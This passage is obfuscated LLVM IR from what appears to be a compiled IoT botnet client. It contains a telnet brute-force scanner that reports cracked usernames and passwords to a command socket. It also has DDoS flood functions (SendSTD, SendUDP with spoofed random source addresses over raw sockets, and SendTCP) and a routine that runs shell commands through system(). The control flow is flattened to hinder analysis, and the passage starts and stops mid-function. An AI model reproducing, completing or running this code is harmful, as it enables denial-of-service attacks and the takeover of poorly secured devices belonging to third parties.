  %1217 = load i32, i32* %6, align 4
  %1218 = sext i32 %1217 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %1218
  call void @advance_telstate(%struct.telstate_t* %1219, i32 16)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:1220:                                   ; preds = %loopEntry
  %1221 = load i32, i32* @mainCommSock, align 4
  %1222 = load i32, i32* %6, align 4
  %1223 = sext i32 %1222 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 1
  %1226 = bitcast i32* %1225 to %struct.in_addr*
  %1227 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1226, i32 0, i32 0
  %1228 = load i32, i32* %1227, align 4
  %1229 = call i8* @inet_ntoa(i32 %1228) #5
  %1230 = load i32, i32* %6, align 4
  %1231 = sext i32 %1230 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 4
  %1234 = load i8, i8* %1233, align 2
  %1235 = zext i8 %1234 to i64
  %1236 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1235
  %1237 = load i8*, i8** %1236, align 8
  %1238 = load i32, i32* %6, align 4
  %1239 = sext i32 %1238 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 5
  %1242 = load i8, i8* %1241, align 1
  %1243 = zext i8 %1242 to i64
  %1244 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1243
  %1245 = load i8*, i8** %1244, align 8
  %1246 = call i32 (i32, i8*, ...) @sockprintf(i32 %1221, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.289, i32 0, i32 0), i8* %1229, i8* %1237, i8* %1245)
  %1247 = load i32, i32* %6, align 4
  %1248 = sext i32 %1247 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %1248
  call void @reset_telstate(%struct.telstate_t* %1249)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:1250:                                   ; preds = %loopEntry
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:1251:                                   ; preds = %loopEntry
  %1252 = load i32, i32* %6, align 4
  %1253 = add nsw i32 %1252, 1
  store i32 %1253, i32* %6, align 4
  store i32 1427603878, i32* %switchVar
  br label %loopEnd

; <label>:1254:                                   ; preds = %loopEntry
  store i32 1346116779, i32* %switchVar
  br label %loopEnd

; <label>:1255:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %1254, %1251, %1250, %NewDefault, %1220, %1216, %1213, %1211, %1210, %1209, %1208, %1207, %1206, %1205, %1204, %1203, %1202, %1201, %1200, %1199, %1172, %1168, %1153, %1149, %1136, %1132, %1119, %1115, %1102, %1098, %1085, %1081, %1068, %1064, %1051, %1047, %1034, %1030, %1017, %1013, %1000, %996, %983, %979, %966, %962, %949, %945, %918, %914, %910, %872, %868, %864, %826, %825, %824, %823, %822, %818, %814, %805, %801, %790, %786, %775, %760, %756, %752, %743, %742, %741, %737, %733, %722, %707, %703, %699, %690, %686, %683, %682, %678, %661, %657, %656, %652, %648, %639, %638, %634, %623, %622, %621, %617, %616, %590, %586, %577, %568, %564, %549, %534, %530, %526, %509, %508, %504, %493, %492, %488, %484, %469, %454, %450, %446, %429, %428, %424, %413, %412, %408, %404, %389, %374, %373, %369, %358, %357, %353, %349, %348, %331, %327, %312, %278, %277, %268, %267, %266, %262, %258, %253, %230, %229, %204, %203, %202, %197, %188, %183, %162, %153, %133, %124, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %NodeBlock19, %LeafBlock21, %NodeBlock23, %NodeBlock25, %NodeBlock27, %NodeBlock29, %NodeBlock31, %99, %92, %84, %79, %78, %77, %76, %73, %59, %54, %38, %36, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #5
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #5
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 289770432, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 289770432, label %36
    i32 -1979108804, label %40
    i32 1277064730, label %53
    i32 747827464, label %56
    i32 115310773, label %57
    i32 330019450, label %60
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  %39 = select i1 %38, i32 -1979108804, i32 115310773
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %7, align 4
  %42 = call i64 @send(i32 %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.290, i32 0, i32 0), i64 69, i32 0)
  %43 = load i32, i32* %7, align 4
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  %46 = call i64 @time(i64* null) #5
  %47 = load i64, i64* %8, align 8
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add nsw i64 %47, %49
  %51 = icmp sge i64 %46, %50
  %52 = select i1 %51, i32 1277064730, i32 747827464
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @close(i32 %54)
  call void @_exit(i32 0) #11
  unreachable

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 115310773, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %11, align 4
  %59 = add i32 %58, 1
  store i32 %59, i32* %11, align 4
  store i32 289770432, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %56, %40, %36, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -266553893, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -266553893, label %first
    i32 -588751463, label %28
    i32 -143680874, label %32
    i32 572498576, label %37
    i32 1660721946, label %43
    i32 -243274293, label %44
    i32 192737149, label %52
    i32 -1064422436, label %53
    i32 1178561321, label %59
    i32 1533799001, label %60
    i32 -1035743404, label %61
    i32 162505002, label %66
    i32 1099009063, label %73
    i32 -1871756096, label %118
    i32 -1484413028, label %120
    i32 1481506167, label %125
    i32 -855547345, label %152
    i32 -1193451602, label %153
    i32 15292483, label %166
    i32 -1093940251, label %168
    i32 1044228232, label %173
    i32 -1735793950, label %200
    i32 692996106, label %206
    i32 696604445, label %207
    i32 1877486051, label %208
    i32 794328431, label %211
    i32 -1236654371, label %213
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 -588751463, i32 -143680874
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 572498576, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 572498576, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 1660721946, i32 -243274293
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1236654371, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %11, align 4
  store i32 %47, i32* %14, align 4
  %48 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -1064422436, i32 192737149
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 -1236654371, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #5
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 1178561321, i32 1533799001
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1236654371, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 50, i32* %17, align 4
  store i32 -1035743404, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %17, align 4
  %64 = icmp ne i32 %62, 0
  %65 = select i1 %64, i32 162505002, i32 1099009063
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i64 @time(i64* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = zext i32 %68 to i64
  %70 = xor i64 %67, %69
  %71 = trunc i64 %70 to i32
  call void @srand(i32 %71) #5
  %72 = call i32 @rand() #5
  call void @init_rand(i32 %72)
  store i32 -1035743404, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sub nsw i32 32, %74
  %76 = shl i32 1, %75
  %77 = sub nsw i32 %76, 1
  %78 = xor i32 %77, -1
  store i32 %78, i32* %18, align 4
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 28, %80
  store i64 %81, i64* %.reg2mem2
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %19, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %83 = alloca i8, i64 %.reload4, align 16
  store i8* %83, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %84 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.udphdr*
  store %struct.udphdr* %88, %struct.udphdr** %21, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %18, align 4
  %94 = call i32 @getRandomIP(i32 %93)
  %95 = call i32 @htonl(i32 %94) #10
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 8, %97
  %99 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 17, i32 %99)
  %100 = load i32, i32* %10, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 8, %101
  %103 = trunc i64 %102 to i16
  %104 = call zeroext i16 @htons(i16 zeroext %103) #10
  %105 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %106 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.2*
  %108 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %107, i32 0, i32 2
  store i16 %104, i16* %108, align 2
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %112 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.1* %112 to %struct.anon.2*
  %114 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %113, i32 0, i32 0
  store i16 %110, i16* %114, align 2
  %115 = load i32, i32* %8, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -1871756096, i32 -1484413028
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @rand_cmwc()
  store i32 1481506167, i32* %switchVar
  store i32 %119, i32* %.reg2mem10
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %8, align 4
  %122 = trunc i32 %121 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #10
  %124 = zext i16 %123 to i32
  store i32 1481506167, i32* %switchVar
  store i32 %124, i32* %.reg2mem10
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %126 = trunc i32 %.reload11 to i16
  %127 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %132 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.1* %132 to %struct.anon.2*
  %134 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %133, i32 0, i32 3
  store i16 0, i16* %134, align 2
  %135 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %136 = bitcast %struct.udphdr* %135 to i8*
  %137 = getelementptr inbounds i8, i8* %136, i64 8
  %138 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %137, i32 %138)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %139 = bitcast i8* %.reload8 to i16*
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  %142 = load i16, i16* %141, align 2
  %143 = zext i16 %142 to i32
  %144 = call zeroext i16 @csum(i16* %139, i32 %143)
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 7
  store i16 %144, i16* %146, align 2
  %147 = call i64 @time(i64* null) #5
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = add nsw i64 %147, %149
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -855547345, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 -1193451602, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %15, align 4
  %155 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %156 = call i64 @sendto(i32 %154, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %155, i32 16)
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 0
  store i16 %158, i16* %162, align 2
  %163 = load i32, i32* %8, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 15292483, i32 -1093940251
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @rand_cmwc()
  store i32 1044228232, i32* %switchVar
  store i32 %167, i32* %.reg2mem12
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %8, align 4
  %170 = trunc i32 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #10
  %172 = zext i16 %171 to i32
  store i32 1044228232, i32* %switchVar
  store i32 %172, i32* %.reg2mem12
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %174 = trunc i32 %.reload13 to i16
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 1
  store i16 %174, i16* %178, align 2
  %179 = call i32 @rand_cmwc()
  %180 = trunc i32 %179 to i16
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i32 @getRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #10
  %186 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %188 = bitcast i8* %.reload6 to i16*
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  %191 = load i16, i16* %190, align 2
  %192 = zext i16 %191 to i32
  %193 = call zeroext i16 @csum(i16* %188, i32 %192)
  %194 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 7
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %23, align 4
  %197 = load i32, i32* %14, align 4
  %198 = icmp eq i32 %196, %197
  %199 = select i1 %198, i32 -1735793950, i32 1877486051
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = call i64 @time(i64* null) #5
  %202 = load i32, i32* %22, align 4
  %203 = sext i32 %202 to i64
  %204 = icmp sgt i64 %201, %203
  %205 = select i1 %204, i32 692996106, i32 696604445
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 794328431, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 -855547345, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %23, align 4
  %210 = add i32 %209, 1
  store i32 %210, i32* %23, align 4
  store i32 -855547345, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %212)
  store i32 -1236654371, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %211, %208, %207, %206, %200, %173, %168, %166, %153, %152, %125, %120, %118, %73, %66, %61, %60, %59, %53, %52, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.291, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.292, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.293, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.294, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1118374616, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1118374616, label %first
    i32 195795762, label %31
    i32 70302694, label %35
    i32 2070906970, label %40
    i32 2038317597, label %46
    i32 -163071, label %47
    i32 1723350603, label %54
    i32 -1094302030, label %55
    i32 446682309, label %61
    i32 -381992359, label %62
    i32 -1760892461, label %66
    i32 1663861373, label %67
    i32 -642312008, label %73
    i32 -189720463, label %121
    i32 -1074168648, label %157
    i32 -667566079, label %160
    i32 -610854255, label %164
    i32 726246475, label %169
    i32 674258140, label %177
    i32 -1156278336, label %182
    i32 1584351217, label %190
    i32 793530004, label %195
    i32 -262236219, label %203
    i32 816544382, label %208
    i32 95840867, label %216
    i32 726190143, label %221
    i32 -747700527, label %229
    i32 1905122276, label %230
    i32 -655551924, label %231
    i32 1562573953, label %232
    i32 2011750399, label %233
    i32 1030613165, label %234
    i32 628617675, label %236
    i32 -221991199, label %237
    i32 -361737560, label %255
    i32 127935275, label %257
    i32 1934837574, label %262
    i32 -2010116253, label %288
    i32 -767385673, label %289
    i32 -570209970, label %336
    i32 -1819386318, label %342
    i32 -122882172, label %343
    i32 -420117700, label %344
    i32 1867029092, label %347
    i32 -511586619, label %349
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 195795762, i32 70302694
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 2070906970, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
